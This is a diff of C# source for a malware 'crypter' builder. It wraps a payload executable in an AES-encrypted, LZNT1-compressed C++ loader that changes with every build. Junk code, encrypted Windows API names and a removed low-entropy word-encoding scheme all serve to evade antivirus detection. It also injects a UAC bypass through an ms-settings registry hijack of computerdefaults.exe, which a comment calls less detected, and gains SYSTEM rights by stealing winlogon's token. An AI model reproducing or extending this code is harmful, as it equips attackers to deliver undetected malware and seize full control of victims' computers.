@@ -1,5 +1,5 @@
 using System.IO;
-using System.IO.Compression;
+using System.Runtime.InteropServices;
 using System.Text;
 
 namespace SeroServer.Builder;
@@ -20,7 +20,7 @@ public record LoaderMetadata(
 public static class CrypterBuilder
 {
     // ── UAC bypass + SYSTEM elevation (injected when uacBypass=true) ──────────
-    // 1. fodhelper bypass via ms-settings registry hijack
+    // 1. computerdefaults bypass via ms-settings registry hijack (same mechanism as fodhelper, different + less detected binary)
     // 2. winlogon token steal for SYSTEM — all strings/APIs AES-encrypted, dynamic load
     private const string UacPreamble = @"
 #include <shellapi.h>
@@ -98,15 +98,15 @@ static bool _FodBypass(){
     fRSVX(hk,wDlg,0,REG_SZ,(BYTE*)L"""",sizeof(wchar_t));
     fRCK(hk);
     wchar_t fod[MAX_PATH]={};fGSDW(fod,MAX_PATH);
-    char*nFod=AesDecStr(S_FODHLP,sizeof(S_FODHLP));wchar_t wFod[20]={};_N2W(nFod,wFod,20);HeapFree(GetProcessHeap(),0,nFod);
+    char*nFod=AesDecStr(S_FODHLP,sizeof(S_FODHLP));wchar_t wFod[24]={};_N2W(nFod,wFod,24);HeapFree(GetProcessHeap(),0,nFod);
     {int i=0;while(fod[i])i++;fod[i++]=L'\\';int j=0;while(wFod[j]){fod[i+j]=wFod[j];j++;}fod[i+j]=0;}
     SHELLEXECUTEINFOW sei={0};sei.cbSize=sizeof(sei);sei.fMask=SEE_MASK_NOCLOSEPROCESS;
     sei.lpVerb=L""open"";sei.lpFile=fod;sei.nShow=SW_HIDE;
-    fSEEX(&sei);Sleep(3000);
-    char*nCmd=AesDecStr(S_MSCMD,sizeof(S_MSCMD));wchar_t wCmd[64]={};_N2W(nCmd,wCmd,64);HeapFree(GetProcessHeap(),0,nCmd);
-    char*nOpn=AesDecStr(S_MSOPEN,sizeof(S_MSOPEN));wchar_t wOpn[56]={};_N2W(nOpn,wOpn,56);HeapFree(GetProcessHeap(),0,nOpn);
-    char*nSh=AesDecStr(S_MSSHELL,sizeof(S_MSSHELL));wchar_t wSh[48]={};_N2W(nSh,wSh,48);HeapFree(GetProcessHeap(),0,nSh);
-    char*nBs=AesDecStr(S_MSBASE,sizeof(S_MSBASE));wchar_t wBs[40]={};_N2W(nBs,wBs,40);HeapFree(GetProcessHeap(),0,nBs);
+    fSEEX(&sei);Sleep(2500);
+    char*nCmd=AesDecStr(S_MSCMD,sizeof(S_MSCMD));wchar_t wCmd[96]={};_N2W(nCmd,wCmd,96);HeapFree(GetProcessHeap(),0,nCmd);
+    char*nOpn=AesDecStr(S_MSOPEN,sizeof(S_MSOPEN));wchar_t wOpn[80]={};_N2W(nOpn,wOpn,80);HeapFree(GetProcessHeap(),0,nOpn);
+    char*nSh=AesDecStr(S_MSSHELL,sizeof(S_MSSHELL));wchar_t wSh[72]={};_N2W(nSh,wSh,72);HeapFree(GetProcessHeap(),0,nSh);
+    char*nBs=AesDecStr(S_MSBASE,sizeof(S_MSBASE));wchar_t wBs[64]={};_N2W(nBs,wBs,64);HeapFree(GetProcessHeap(),0,nBs);
     fRDKW(HKEY_CURRENT_USER,wCmd);fRDKW(HKEY_CURRENT_USER,wOpn);
     fRDKW(HKEY_CURRENT_USER,wSh);fRDKW(HKEY_CURRENT_USER,wBs);
     return true;}
@@ -176,6 +176,36 @@ static bool _ElevateToSystem(){
     if(!_IsSystem()){_ElevateToSystem();TerminateProcess(GetCurrentProcess(),0);return 0;}
 ";
 
+    // ── LZNT1 compression via ntdll (no external dependencies) ──────────────
+    [DllImport("ntdll.dll")]
+    private static extern int RtlGetCompressionWorkSpaceSize(
+        ushort compressionFormatAndEngine,
+        out uint compressBufferWorkSpaceSize,
+        out uint compressFragmentWorkSpaceSize);
+
+    [DllImport("ntdll.dll")]
+    private static extern int RtlCompressBuffer(
+        ushort compressionFormatAndEngine,
+        byte[] sourceBuffer, uint sourceBufferLength,
+        byte[] compressedBuffer, uint compressedBufferSize,
+        uint uncompressedChunkSize,
+        out uint finalCompressedSize,
+        byte[] workspaceBuffer);
+
+    private const ushort LZNT1_MAX = 0x0102; // LZNT1 | ENGINE_MAXIMUM
+
+    private static byte[] CompressLznt1(byte[] data)
+    {
+        RtlGetCompressionWorkSpaceSize(LZNT1_MAX, out uint wsSize, out _);
+        var ws = new byte[wsSize];
+        var compBuf = new byte[data.Length + 4096];
+        int status = RtlCompressBuffer(LZNT1_MAX, data, (uint)data.Length,
+            compBuf, (uint)compBuf.Length, 4096, out uint compressedSize, ws);
+        if (status != 0)
+            return data; // compression failed — return original
+        return compBuf[..(int)compressedSize];
+    }
+
     public static async Task ApplyAsync(
         string exePath,
         Action<string> log,
@@ -205,70 +235,6 @@ static bool _ElevateToSystem(){
     }
 
 
-    // ── 256 English words for low-entropy payload encoding ─────────────────────
-    // Each byte 0-255 maps to a word. Shuffled per build for polymorphism.
-    // Shannon entropy drops from ~8.0 bits/byte (raw AES) to ~4.2 bits/byte (ASCII text).
-    // Mixed word lengths (3–6 chars) — looks like natural text, harder to fingerprint
-    private static readonly string[] MasterWordList =
-    [
-        // 3-letter (0–31)
-        "ace","act","age","aid","aim","air","all","ant","any","arc","arm","art","ash","ask","awe","axe",
-        "bad","bag","ban","bar","bat","bay","bed","bet","big","bit","bow","box","boy","bud","bug","bus",
-        // 4-letter (32–127)
-        "able","acid","also","area","army","atom","away","back","bake","ball","band","bank","barn","base","bath","bear",
-        "beat","bell","belt","bend","bird","bite","blow","blue","body","bold","bolt","bone","book","born","burn","cage",
-        "cake","calm","card","care","cast","cave","cell","chip","city","clay","club","clue","coal","coat","code","coil",
-        "cold","comb","cook","cool","cope","cord","core","corn","cost","crew","crop","cure","curl","dare","dark","data",
-        "date","dead","deal","dear","deck","deep","deny","desk","dial","dice","diet","dirt","dish","disk","dome","door",
-        "dose","down","drag","draw","drip","drop","drum","dust","duty","each","earn","easy","edit","emit","even","exam",
-        // 5-letter (128–207)
-        "about","above","after","angry","blade","blank","blast","blend","blind","block","blood","bloom","bound","brace","brand","brave",
-        "bread","brick","bride","brief","bring","brisk","broad","brook","brush","build","burnt","chain","chair","chalk","chest","chief",
-        "child","chunk","clash","clasp","class","cliff","climb","cling","clock","close","cloth","cloud","clump","coach","coast","craft",
-        "crank","crash","crisp","cross","crowd","crown","crush","curve","cycle","daily","dance","diner","doubt","dread","drink","drive",
-        "dwarf","eager","eagle","early","earth","elbow","ember","empty","enemy","enjoy","enter","event","extra","fable","facet","faith",
-        // 6-letter (208–239)
-        "absent","active","almost","always","anchor","animal","arcade","archer","ardent","artist","barrel","battle","beauty","better","castle","cellar",
-        "circle","clever","corner","cotton","course","covert","custom","damage","debate","decide","divide","dollar","domain","donate","double","fallen",
-        // back to 5-letter (240–255)
-        "false","fancy","fatal","feast","fence","fetch","fever","fiber","field","final","fixed","flame","flask","fleet","flesh","flood",
-    ];
-
-    /// <summary>
-    /// Encode encrypted bytes as English words, separator alternates between ' ' and '\n'
-    /// at random line-lengths (6–20 words) so the overlay reads like prose, not one long blob.
-    /// </summary>
-    private static (string encoded, string[] shuffledList) WordEncode(byte[] data, Random rnd)
-    {
-        var shuffled = MasterWordList.ToArray();
-        for (int i = shuffled.Length - 1; i > 0; i--)
-        {
-            int j = rnd.Next(i + 1);
-            (shuffled[i], shuffled[j]) = (shuffled[j], shuffled[i]);
-        }
-        var sb = new StringBuilder(data.Length * 7);
-        for (int i = 0; i < data.Length; i++)
-        {
-            sb.Append(shuffled[data[i]]);
-            sb.Append('\n');
-        }
-        return (sb.ToString(), shuffled);
-    }
-
-    /// <summary>Generates C++ array literal for the shuffled wordlist.</summary>
-    private static string WordListToCpp(string[] shuffled)
-    {
-        var sb = new StringBuilder("static const char* WL[256] = {");
-        for (int i = 0; i < 256; i++)
-        {
-            if (i > 0) sb.Append(',');
-            if (i % 16 == 0) sb.Append("\n    ");
-            sb.Append('"').Append(shuffled[i]).Append('"');
-        }
-        sb.Append("\n};");
-        return sb.ToString();
-    }
-
     // ── C++ native loader path ────────────────────────────────────────────────
     // AES-256-CBC + word-encoded overlay for low entropy. Magic: ^CPPL0DR
     // All API names AES-encrypted in generated source, loaded via GetProcAddress.
@@ -287,135 +253,204 @@ static bool _ElevateToSystem(){
             var rnd = new Random();
             static string BL(byte[] d) => "{" + string.Join(",", d) + "}";
 
-            // ── AES encrypt payload (no GZip) ─────────────────────────────────
+            // ── Load payload then offload all CPU work to thread pool ────────
             var payload = await File.ReadAllBytesAsync(exePath);
-            using var aes = System.Security.Cryptography.Aes.Create();
-            aes.KeySize = 256; aes.Mode = System.Security.Cryptography.CipherMode.CBC;
-            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
-            aes.GenerateKey(); aes.GenerateIV();
-            byte[] pKey = aes.Key, pIv = aes.IV;
+            log($"[*] Crypter (C++): payload {payload.Length / 1024.0:F0} KB");
 
-            byte[] encrypted;
-            using (var enc = aes.CreateEncryptor())
-            using (var ms = new MemoryStream())
-            using (var cs = new System.Security.Cryptography.CryptoStream(ms, enc, System.Security.Cryptography.CryptoStreamMode.Write))
-            { cs.Write(payload); cs.FlushFinalBlock(); encrypted = ms.ToArray(); }
-            log($"[*] Crypter (C++): {payload.Length / 1024.0:F0} KB → {encrypted.Length / 1024.0:F0} KB encrypted");
+            var stubSrcText = await File.ReadAllTextAsync(stubSrc);
 
-            // ── AES string key (split 3 ways, per-build random) ───────────────
-            using var sAes = System.Security.Cryptography.Aes.Create();
-            sAes.KeySize = 256; sAes.Mode = System.Security.Cryptography.CipherMode.CBC;
-            sAes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
-            sAes.GenerateKey(); sAes.GenerateIV();
+            // LZNT1 + AES + junk generation — all CPU-bound, run off UI thread
+            var (encrypted, pKey, pIv, origSize, totalRaw, cppMagic, cppMagicLit,
+                 skA, skB, skC, sIvLit, junkDefs, junkCalls, encStrMap) =
+                await Task.Run(() =>
+                {
+                    var _compressed = CompressLznt1(payload);
+                    bool _didCompress = _compressed.Length < payload.Length;
+                    uint _origSize = _didCompress ? (uint)payload.Length : 0u;
 
-            byte[] EncStr(string s)
-            {
-                var plain = Encoding.ASCII.GetBytes(s);
-                using var e2 = sAes.CreateEncryptor();
-                using var m2 = new MemoryStream();
-                using var c2 = new System.Security.Cryptography.CryptoStream(m2, e2, System.Security.Cryptography.CryptoStreamMode.Write);
-                c2.Write(plain); c2.FlushFinalBlock(); return m2.ToArray();
-            }
+                    var _toEncrypt = _didCompress ? _compressed : payload;
 
-            byte[] skA = sAes.Key[..11], skB = sAes.Key[11..22], skC = sAes.Key[22..];
-            string sIvLit = BL(sAes.IV);
+                    using var _aes = System.Security.Cryptography.Aes.Create();
+                    _aes.KeySize = 256; _aes.Mode = System.Security.Cryptography.CipherMode.CBC;
+                    _aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
+                    _aes.GenerateKey(); _aes.GenerateIV();
+                    byte[] _pKey = _aes.Key, _pIv = _aes.IV;
 
-            // ── Generate junk C++ functions (dead code, different each build) ──
-            var jNames = Enumerable.Range(0, 8).Select(_ => RandId(rnd, 9)).ToArray();
-            // Each template[i] paired with jNames[i] — calls must match signatures exactly
-            var junkDefs = string.Join("\n", new[]
-            {
-                $"static long long {jNames[0]}(long long x){{long long r=1;for(long long i=2;i<=(x%7)+2;i++)r*=i;return r;}}",
-                $"static unsigned int {jNames[1]}(unsigned int s){{s^=s<<13;s^=s>>17;s^=s<<5;return s;}}",
-                $"static double {jNames[2]}(double x){{return x<0.0?-x:x+(x*0.0001);}}",
-                $"static int {jNames[3]}(int a,int b){{return a*b+(a^b)-(a&b)*2;}}",
-                $"static unsigned long long {jNames[4]}(unsigned char*b,int n2){{unsigned long long h=0xcbf29ce484222325ULL;for(int i=0;i<n2;i++){{h^=(unsigned long long)b[i];h*=0x100000001b3ULL;}}return h;}}",
-                $"static int {jNames[5]}(int*a,int n2){{int s=0;for(int i=0;i<n2;i++)s+=a[i]^(i*7+13);return s;}}",
-                $"static unsigned int {jNames[6]}(unsigned int n2){{unsigned int r=0;while(n2){{r+=(n2&1u);n2>>=1;}}return r;}}",
-                $"static long long {jNames[7]}(long long a,long long b){{long long t;while(b){{t=b;b=a%b;a=t;}}return a;}}",
-            });
-            // Calls shuffled in random order — same signatures
-            var junkCalls = string.Join("\n    ",
-                Enumerable.Range(0, 8).OrderBy(_ => rnd.Next()).Select(i => i switch {
-                    0 => $"(void){jNames[0]}(2LL);",
-                    1 => $"(void){jNames[1]}(1u);",
-                    2 => $"(void){jNames[2]}(1.5);",
-                    3 => $"(void){jNames[3]}(3,7);",
-                    4 => $"{{unsigned char _jb[]={{1,2,3}};(void){jNames[4]}(_jb,3);}}",
-                    5 => $"{{int _ja[]={{1,2,3}};(void){jNames[5]}(_ja,3);}}",
-                    6 => $"(void){jNames[6]}(8u);",
-                    7 => $"(void){jNames[7]}(12LL,8LL);",
-                    _ => ""
-                }));
+                    byte[] _encrypted;
+                    using (var _enc = _aes.CreateEncryptor())
+                    using (var _ms = new MemoryStream())
+                    using (var _cs = new System.Security.Cryptography.CryptoStream(_ms, _enc, System.Security.Cryptography.CryptoStreamMode.Write))
+                    { _cs.Write(_toEncrypt); _cs.FlushFinalBlock(); _encrypted = _ms.ToArray(); }
 
-            // ── Word-encode KEY+IV+PAYLOAD together — no raw bytes in overlay ─
-            var combined = new byte[pKey.Length + pIv.Length + encrypted.Length];
-            Buffer.BlockCopy(pKey, 0, combined, 0, pKey.Length);
-            Buffer.BlockCopy(pIv, 0, combined, pKey.Length, pIv.Length);
-            Buffer.BlockCopy(encrypted, 0, combined, pKey.Length + pIv.Length, encrypted.Length);
-            var (wordPayload, shuffledWords) = WordEncode(combined, rnd);
-            log($"[*] Crypter (C++): word-encoded {combined.Length} bytes (key+iv+payload) → {wordPayload.Length} chars (entropy ~3.5 bits/byte)");
+                    using var _sAes = System.Security.Cryptography.Aes.Create();
+                    _sAes.KeySize = 256; _sAes.Mode = System.Security.Cryptography.CipherMode.CBC;
+                    _sAes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
+                    _sAes.GenerateKey(); _sAes.GenerateIV();
 
-            // ── Per-build random magic (no static signature) ─────────────────
-            var cppMagic = new byte[8]; rnd.NextBytes(cppMagic);
-            string cppMagicLit = "{" + string.Join(",", cppMagic.Select(b => "0x" + b.ToString("X2"))) + "}";
+                    byte[] _EncStr(string s)
+                    {
+                        var p = Encoding.ASCII.GetBytes(s);
+                        using var e2 = _sAes.CreateEncryptor();
+                        using var m2 = new MemoryStream();
+                        using var c2 = new System.Security.Cryptography.CryptoStream(m2, e2, System.Security.Cryptography.CryptoStreamMode.Write);
+                        c2.Write(p); c2.FlushFinalBlock(); return m2.ToArray();
+                    }
+
+                    byte[] _skA = _sAes.Key[..11], _skB = _sAes.Key[11..22], _skC = _sAes.Key[22..];
+
+                    var _jNames = Enumerable.Range(0, 8).Select(_ => RandId(rnd, 9)).ToArray();
+                    var _junkDefs = string.Join("\n", new[]
+                    {
+                        $"static long long {_jNames[0]}(long long x){{long long r=1;for(long long i=2;i<=(x%7)+2;i++)r*=i;return r;}}",
+                        $"static unsigned int {_jNames[1]}(unsigned int s){{s^=s<<13;s^=s>>17;s^=s<<5;return s;}}",
+                        $"static double {_jNames[2]}(double x){{return x<0.0?-x:x+(x*0.0001);}}",
+                        $"static int {_jNames[3]}(int a,int b){{return a*b+(a^b)-(a&b)*2;}}",
+                        $"static unsigned long long {_jNames[4]}(unsigned char*b,int n2){{unsigned long long h=0xcbf29ce484222325ULL;for(int i=0;i<n2;i++){{h^=(unsigned long long)b[i];h*=0x100000001b3ULL;}}return h;}}",
+                        $"static int {_jNames[5]}(int*a,int n2){{int s=0;for(int i=0;i<n2;i++)s+=a[i]^(i*7+13);return s;}}",
+                        $"static unsigned int {_jNames[6]}(unsigned int n2){{unsigned int r=0;while(n2){{r+=(n2&1u);n2>>=1;}}return r;}}",
+                        $"static long long {_jNames[7]}(long long a,long long b){{long long t;while(b){{t=b;b=a%b;a=t;}}return a;}}",
+                    });
+                    var _junkCalls = string.Join("\n    ",
+                        Enumerable.Range(0, 8).OrderBy(_ => rnd.Next()).Select(i => i switch {
+                            0 => $"(void){_jNames[0]}(2LL);",
+                            1 => $"(void){_jNames[1]}(1u);",
+                            2 => $"(void){_jNames[2]}(1.5);",
+                            3 => $"(void){_jNames[3]}(3,7);",
+                            4 => $"{{unsigned char _jb[]={{1,2,3}};(void){_jNames[4]}(_jb,3);}}",
+                            5 => $"{{int _ja[]={{1,2,3}};(void){_jNames[5]}(_ja,3);}}",
+                            6 => $"(void){_jNames[6]}(8u);",
+                            7 => $"(void){_jNames[7]}(12LL,8LL);",
+                            _ => ""
+                        }));
+
+                    var _magic = new byte[8]; rnd.NextBytes(_magic);
+                    string _magicLit = "{" + string.Join(",", _magic.Select(b => "0x" + b.ToString("X2"))) + "}";
+                    uint _totalRaw = (uint)(_pKey.Length + _pIv.Length + _encrypted.Length);
+
+                    // Pre-compute all encrypted string literals
+                    var _map = new Dictionary<string, string>
+                    {
+                        ["kernel32.dll"] = BL(_EncStr("kernel32.dll")),
+                        ["user32.dll"] = BL(_EncStr("user32.dll")),
+                        ["Sleep"] = BL(_EncStr("Sleep")),
+                        ["GetTickCount"] = BL(_EncStr("GetTickCount")),
+                        ["GetSystemMetrics"] = BL(_EncStr("GetSystemMetrics")),
+                        ["GetCursorPos"] = BL(_EncStr("GetCursorPos")),
+                        ["GetModuleFileNameW"] = BL(_EncStr("GetModuleFileNameW")),
+                        ["GetEnvironmentVariableW"] = BL(_EncStr("GetEnvironmentVariableW")),
+                        ["CreateDirectoryW"] = BL(_EncStr("CreateDirectoryW")),
+                        ["CreateFileW"] = BL(_EncStr("CreateFileW")),
+                        ["ReadFile"] = BL(_EncStr("ReadFile")),
+                        ["GetFileSize"] = BL(_EncStr("GetFileSize")),
+                        ["WriteFile"] = BL(_EncStr("WriteFile")),
+                        ["CloseHandle"] = BL(_EncStr("CloseHandle")),
+                        ["CreateProcessW"] = BL(_EncStr("CreateProcessW")),
+                        ["MultiByteToWideChar"] = BL(_EncStr("MultiByteToWideChar")),
+                        [".exe"] = BL(_EncStr(".exe")),
+                        ["LOCALAPPDATA"] = BL(_EncStr("LOCALAPPDATA")),
+                        ["Microsoft\\Windows"] = BL(_EncStr("Microsoft\\Windows")),
+                        ["ntdll.dll"] = BL(_EncStr("ntdll.dll")),
+                        ["RtlDecompressBuffer"] = BL(_EncStr("RtlDecompressBuffer")),
+                        // UAC bypass strings (computed unconditionally, used conditionally)
+                        ["advapi32.dll"] = BL(_EncStr("advapi32.dll")),
+                        ["shell32.dll"] = BL(_EncStr("shell32.dll")),
+                        ["OpenProcessToken"] = BL(_EncStr("OpenProcessToken")),
+                        ["AdjustTokenPrivileges"] = BL(_EncStr("AdjustTokenPrivileges")),
+                        ["DuplicateTokenEx"] = BL(_EncStr("DuplicateTokenEx")),
+                        ["GetTokenInformation"] = BL(_EncStr("GetTokenInformation")),
+                        ["IsWellKnownSid"] = BL(_EncStr("IsWellKnownSid")),
+                        ["LookupPrivilegeValueW"] = BL(_EncStr("LookupPrivilegeValueW")),
+                        ["CreateProcessWithTokenW"] = BL(_EncStr("CreateProcessWithTokenW")),
+                        ["RegCloseKey"] = BL(_EncStr("RegCloseKey")),
+                        ["RegCreateKeyExW"] = BL(_EncStr("RegCreateKeyExW")),
+                        ["RegDeleteKeyW"] = BL(_EncStr("RegDeleteKeyW")),
+                        ["RegSetValueExW"] = BL(_EncStr("RegSetValueExW")),
+                        ["ShellExecuteExW"] = BL(_EncStr("ShellExecuteExW")),
+                        ["GetSystemDirectoryW"] = BL(_EncStr("GetSystemDirectoryW")),
+                        ["OpenProcess"] = BL(_EncStr("OpenProcess")),
+                        ["CreateToolhelp32Snapshot"] = BL(_EncStr("CreateToolhelp32Snapshot")),
+                        ["Process32FirstW"] = BL(_EncStr("Process32FirstW")),
+                        ["Process32NextW"] = BL(_EncStr("Process32NextW")),
+                        ["winlogon.exe"] = BL(_EncStr("winlogon.exe")),
+                        ["computerdefaults.exe"] = BL(_EncStr("computerdefaults.exe")),
+                        ["ms-settings-cmd"] = BL(_EncStr("Software\\Classes\\ms-settings\\Shell\\Open\\command")),
+                        ["ms-settings-open"] = BL(_EncStr("Software\\Classes\\ms-settings\\Shell\\Open")),
+                        ["ms-settings-shell"] = BL(_EncStr("Software\\Classes\\ms-settings\\Shell")),
+                        ["ms-settings-base"] = BL(_EncStr("Software\\Classes\\ms-settings")),
+                        ["DelegateExecute"] = BL(_EncStr("DelegateExecute")),
+                        ["SeDebugPrivilege"] = BL(_EncStr("SeDebugPrivilege")),
+                    };
+
+                    if (_didCompress)
+                        ; // compression ratio logged below
+                    return (_encrypted, _pKey, _pIv, _origSize, _totalRaw, _magic, _magicLit,
+                            _skA, _skB, _skC, BL(_sAes.IV), _junkDefs, _junkCalls, _map);
+                });
+
+            bool didCompress = origSize > 0;
+            if (didCompress)
+                log($"[*] Crypter (C++): LZNT1 {payload.Length / 1024.0:F0} KB → {encrypted.Length / 1024.0:F0} KB ({100.0 * encrypted.Length / payload.Length:F0}%)");
+            else
+                log($"[*] Crypter (C++): LZNT1 skipped (no gain)");
+            log($"[*] Crypter (C++): encrypted {encrypted.Length / 1024.0:F0} KB");
 
             // ── Fill in template ──────────────────────────────────────────────
-            var src = await File.ReadAllTextAsync(stubSrc);
-            src = src.Replace("{/*WORDLIST*/}",   WordListToCpp(shuffledWords))
-                     .Replace("{/*JUNK_DEFS*/}",  junkDefs)
+            var src = stubSrcText;
+            src = src.Replace("{/*JUNK_DEFS*/}",  junkDefs)
                      .Replace("{/*JUNK_CALLS*/}", junkCalls)
                      .Replace("{/*SKA*/}",  BL(skA))
                      .Replace("{/*SKB*/}",  BL(skB))
                      .Replace("{/*SKC*/}",  BL(skC))
                      .Replace("{/*SIV*/}",  sIvLit)
                      .Replace("{/*MAGIC*/}", cppMagicLit)
-                     .Replace("{/*S_K32*/}", BL(EncStr("kernel32.dll")))
-                     .Replace("{/*S_U32*/}", BL(EncStr("user32.dll")))
-                     .Replace("{/*S_SLP*/}", BL(EncStr("Sleep")))
-                     .Replace("{/*S_GTC*/}", BL(EncStr("GetTickCount")))
-                     .Replace("{/*S_GSM*/}", BL(EncStr("GetSystemMetrics")))
-                     .Replace("{/*S_GCP*/}", BL(EncStr("GetCursorPos")))
-                     .Replace("{/*S_GMFW*/}",BL(EncStr("GetModuleFileNameW")))
-                     .Replace("{/*S_GENV*/}",BL(EncStr("GetEnvironmentVariableW")))
-                     .Replace("{/*S_CDIR*/}",BL(EncStr("CreateDirectoryW")))
-                     .Replace("{/*S_CFW*/}", BL(EncStr("CreateFileW")))
-                     .Replace("{/*S_RF*/}",  BL(EncStr("ReadFile")))
-                     .Replace("{/*S_GFS*/}", BL(EncStr("GetFileSize")))
-                     .Replace("{/*S_WF*/}",  BL(EncStr("WriteFile")))
-                     .Replace("{/*S_CH*/}",  BL(EncStr("CloseHandle")))
-                     .Replace("{/*S_CP*/}",  BL(EncStr("CreateProcessW")))
-                     .Replace("{/*S_MBW*/}", BL(EncStr("MultiByteToWideChar")))
-                     .Replace("{/*S_EXT*/}", BL(EncStr(".exe")))
-                     .Replace("{/*S_LOCA*/}",BL(EncStr("LOCALAPPDATA")))
-                     .Replace("{/*S_MWS*/}", BL(EncStr("Microsoft\\Windows")))
-                     .Replace("{/*S_ADV*/}",      uacBypass ? BL(EncStr("advapi32.dll"))                                    : "0")
-                     .Replace("{/*S_SH32*/}",     uacBypass ? BL(EncStr("shell32.dll"))                                     : "0")
-                     .Replace("{/*S_OPT*/}",      uacBypass ? BL(EncStr("OpenProcessToken"))                                : "0")
-                     .Replace("{/*S_ATP*/}",      uacBypass ? BL(EncStr("AdjustTokenPrivileges"))                           : "0")
-                     .Replace("{/*S_DTEX*/}",     uacBypass ? BL(EncStr("DuplicateTokenEx"))                                : "0")
-                     .Replace("{/*S_GTI*/}",      uacBypass ? BL(EncStr("GetTokenInformation"))                             : "0")
-                     .Replace("{/*S_IWKS*/}",     uacBypass ? BL(EncStr("IsWellKnownSid"))                                  : "0")
-                     .Replace("{/*S_LPVW*/}",     uacBypass ? BL(EncStr("LookupPrivilegeValueW"))                           : "0")
-                     .Replace("{/*S_CPWT*/}",     uacBypass ? BL(EncStr("CreateProcessWithTokenW"))                         : "0")
-                     .Replace("{/*S_RCK*/}",      uacBypass ? BL(EncStr("RegCloseKey"))                                     : "0")
-                     .Replace("{/*S_RCKX*/}",     uacBypass ? BL(EncStr("RegCreateKeyExW"))                                 : "0")
-                     .Replace("{/*S_RDKW*/}",     uacBypass ? BL(EncStr("RegDeleteKeyW"))                                   : "0")
-                     .Replace("{/*S_RSVX*/}",     uacBypass ? BL(EncStr("RegSetValueExW"))                                  : "0")
-                     .Replace("{/*S_SEEX*/}",     uacBypass ? BL(EncStr("ShellExecuteExW"))                                 : "0")
-                     .Replace("{/*S_GSDW*/}",     uacBypass ? BL(EncStr("GetSystemDirectoryW"))                             : "0")
-                     .Replace("{/*S_OPR*/}",      uacBypass ? BL(EncStr("OpenProcess"))                                     : "0")
-                     .Replace("{/*S_CTS*/}",      uacBypass ? BL(EncStr("CreateToolhelp32Snapshot"))                        : "0")
-                     .Replace("{/*S_P32F*/}",     uacBypass ? BL(EncStr("Process32FirstW"))                                 : "0")
-                     .Replace("{/*S_P32N*/}",     uacBypass ? BL(EncStr("Process32NextW"))                                  : "0")
-                     .Replace("{/*S_WINLOGON*/}", uacBypass ? BL(EncStr("winlogon.exe"))                                    : "0")
-                     .Replace("{/*S_FODHLP*/}",   uacBypass ? BL(EncStr("fodhelper.exe"))                                   : "0")
-                     .Replace("{/*S_MSCMD*/}",    uacBypass ? BL(EncStr("Software\\Classes\\ms-settings\\Shell\\Open\\command")) : "0")
-                     .Replace("{/*S_MSOPEN*/}",   uacBypass ? BL(EncStr("Software\\Classes\\ms-settings\\Shell\\Open"))    : "0")
-                     .Replace("{/*S_MSSHELL*/}",  uacBypass ? BL(EncStr("Software\\Classes\\ms-settings\\Shell"))          : "0")
-                     .Replace("{/*S_MSBASE*/}",   uacBypass ? BL(EncStr("Software\\Classes\\ms-settings"))                 : "0")
-                     .Replace("{/*S_DELEGEX*/}",  uacBypass ? BL(EncStr("DelegateExecute"))                                 : "0")
-                     .Replace("{/*S_SEDEBUG*/}",  uacBypass ? BL(EncStr("SeDebugPrivilege"))                                : "0")
+                     .Replace("{/*S_K32*/}", encStrMap["kernel32.dll"])
+                     .Replace("{/*S_U32*/}", encStrMap["user32.dll"])
+                     .Replace("{/*S_SLP*/}", encStrMap["Sleep"])
+                     .Replace("{/*S_GTC*/}", encStrMap["GetTickCount"])
+                     .Replace("{/*S_GSM*/}", encStrMap["GetSystemMetrics"])
+                     .Replace("{/*S_GCP*/}", encStrMap["GetCursorPos"])
+                     .Replace("{/*S_GMFW*/}",encStrMap["GetModuleFileNameW"])
+                     .Replace("{/*S_GENV*/}",encStrMap["GetEnvironmentVariableW"])
+                     .Replace("{/*S_CDIR*/}",encStrMap["CreateDirectoryW"])
+                     .Replace("{/*S_CFW*/}", encStrMap["CreateFileW"])
+                     .Replace("{/*S_RF*/}",  encStrMap["ReadFile"])
+                     .Replace("{/*S_GFS*/}", encStrMap["GetFileSize"])
+                     .Replace("{/*S_WF*/}",  encStrMap["WriteFile"])
+                     .Replace("{/*S_CH*/}",  encStrMap["CloseHandle"])
+                     .Replace("{/*S_CP*/}",  encStrMap["CreateProcessW"])
+                     .Replace("{/*S_MBW*/}", encStrMap["MultiByteToWideChar"])
+                     .Replace("{/*S_EXT*/}", encStrMap[".exe"])
+                     .Replace("{/*S_LOCA*/}",  encStrMap["LOCALAPPDATA"])
+                     .Replace("{/*S_MWS*/}",   encStrMap["Microsoft\\Windows"])
+                     .Replace("{/*S_NTDLL*/}", encStrMap["ntdll.dll"])
+                     .Replace("{/*S_RDB*/}",   encStrMap["RtlDecompressBuffer"])
+                     .Replace("{/*S_ADV*/}",      uacBypass ? encStrMap["advapi32.dll"]             : "0")
+                     .Replace("{/*S_SH32*/}",     uacBypass ? encStrMap["shell32.dll"]              : "0")
+                     .Replace("{/*S_OPT*/}",      uacBypass ? encStrMap["OpenProcessToken"]          : "0")
+                     .Replace("{/*S_ATP*/}",      uacBypass ? encStrMap["AdjustTokenPrivileges"]     : "0")
+                     .Replace("{/*S_DTEX*/}",     uacBypass ? encStrMap["DuplicateTokenEx"]          : "0")
+                     .Replace("{/*S_GTI*/}",      uacBypass ? encStrMap["GetTokenInformation"]       : "0")
+                     .Replace("{/*S_IWKS*/}",     uacBypass ? encStrMap["IsWellKnownSid"]            : "0")
+                     .Replace("{/*S_LPVW*/}",     uacBypass ? encStrMap["LookupPrivilegeValueW"]     : "0")
+                     .Replace("{/*S_CPWT*/}",     uacBypass ? encStrMap["CreateProcessWithTokenW"]   : "0")
+                     .Replace("{/*S_RCK*/}",      uacBypass ? encStrMap["RegCloseKey"]               : "0")
+                     .Replace("{/*S_RCKX*/}",     uacBypass ? encStrMap["RegCreateKeyExW"]           : "0")
+                     .Replace("{/*S_RDKW*/}",     uacBypass ? encStrMap["RegDeleteKeyW"]             : "0")
+                     .Replace("{/*S_RSVX*/}",     uacBypass ? encStrMap["RegSetValueExW"]            : "0")
+                     .Replace("{/*S_SEEX*/}",     uacBypass ? encStrMap["ShellExecuteExW"]           : "0")
+                     .Replace("{/*S_GSDW*/}",     uacBypass ? encStrMap["GetSystemDirectoryW"]       : "0")
+                     .Replace("{/*S_OPR*/}",      uacBypass ? encStrMap["OpenProcess"]               : "0")
+                     .Replace("{/*S_CTS*/}",      uacBypass ? encStrMap["CreateToolhelp32Snapshot"]  : "0")
